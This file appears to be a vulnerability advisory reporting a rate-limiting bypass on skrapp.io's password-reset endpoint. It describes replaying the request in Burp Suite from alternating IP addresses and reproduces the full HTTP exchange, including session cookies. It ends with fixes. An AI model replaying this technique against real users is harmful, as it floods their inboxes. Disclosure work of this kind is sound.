@@ -1,0 +1,81 @@
+Rate Limiting Bypass
+--------------------
+
+Type
+----
+Remote Unauthenticated attack
+
+
+Description
+-----------
+We have managed to identify a Rate Limiting Bypass on the Reset Password Functionality of the "skrapp.io" web app. This security issue would result in Rate Limiting attacks. Rate Limiting attacks occur when rate control of requests sent or received is not set or configured correctly. In this case, the attack requires the attacker to know the email address of the target user/s. An attacker can leverage this issue to flood the users with annoying emails resulting in reputational damage through bad customer experience.
+
+
+Details
+-------
+The test was performed by intercepting the HTTP POST Request "/login/request-reset-pwd" with the Burp Suite (HTTP Proxy tool) and then sending the request to the Burp's Repeater for reuse. To successfully bypass the Rate Limiting, we were sending the Reset Password request once a minute, once with one public IP address and the next time with another public IP address (use of 2 different public IP addresses).
+
+
+The HTTP Request and Response are provided below:
+
+
+Request:
+POST /login/request-reset-pwd HTTP/1.1
+Host: app.skrapp.io
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Origin: https://app.skrapp.io
+Connection: close
+Referer: https://app.skrapp.io/login/request-reset-pwd
+Cookie: connect.sid=s%3A1owJw4NeMf7yq6nZKctrVPxq35VG0SOg.AUkknKU60cPYryfzK73o0SLeyMqjIdz1ZCAUr0s8Avg; _gcl_au=1.1.284712640.1637412748; _ga=GA1.2.531038394.1637412749; _gid=GA1.2.1540083219.1637412749; __hstc=227214402.880755760719710030251f286f59ca97.1637412752404.1637412752404.1637423434360.2; hubspotutk=880755760719710030251f286f59ca97; __cf_bm=SvPx6VwiMi2ZXZs32REfIFYsD5Swv_cvXEwmKKe4lqM-1637423438-0-ATUXqyY8BVSRSKM6P+QAuZfXUcjwEM5o5/O8XWdzAa032z032wCd0Ceb/dpdTXLbflo0P70YyXSiegZwA7roaX49kA6yCPn8x9R7VmteJX4laUtmI3TOFsUkvKVyEvIlMw==; _gat_gtag_UA_45417310_4=1; _gat_UA-45417310-4=1; __hssrc=1; __hssc=227214402.3.1637423434360; _gat=1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+email=a***********s%40gmail.com
+
+
+
+Response:
+HTTP/1.1 302 Found
+Date: Sat, 20 Nov 2021 15:52:28 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+X-Powered-By: Express
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: https://app.skrapp.io
+Access-Control-Allow-Methods: GET,PUT,POST,DELETE
+Access-Control-Allow-Headers: X-Requested-With, X-HTTP-Method-Override, Content-Type, Accept
+Location: /login/request-reset-pwd?success=1
+Vary: Accept, Accept-Encoding
+set-cookie: connect.sid=s%3A1owJw4NeMf7yq6nZKctrVPxq35VG0SOg.AUkknKU60cPYryfzK73o0SLeyMqjIdz1ZCAUr0s8Avg; Domain=skrapp.io; Path=/; Expires=Mon, 20 Dec 2021 15:52:28 GMT; HttpOnly
+CF-Cache-Status: DYNAMIC
+Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Strict-Transport-Security: max-age=15552000; includeSubDomains
+Server: cloudflare
+CF-RAY: 6b12d873ba066f44-ATH
+alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400, h3-28=":443"; ma=86400, h3-27=":443"; ma=86400
+Content-Length: 112
+
+<p>Found. Redirecting to <a href="/login/request-reset-pwd?success=1">/login/request-reset-pwd?success=1</a></p>
+
+
+
+
+Solution
+--------
+
+1. The Rate Limiting should be configured with rules such as:
+   a. If the request was sent 3 times in 2 mins from the same source IP address, then block it for at least 5 mins.
+   b. If the request was sent 4 times in 5 mins from any source IP address, then block the reset request for that specific email address.
+2. Use of Anti-CSRF tokens prevents HTTP Request Reuse from 3rd party Apps/domains/IPs.   
+3. Use of Captcha prevents malicious Bots from abusing web forms to overload users' inbox.
+
+
+
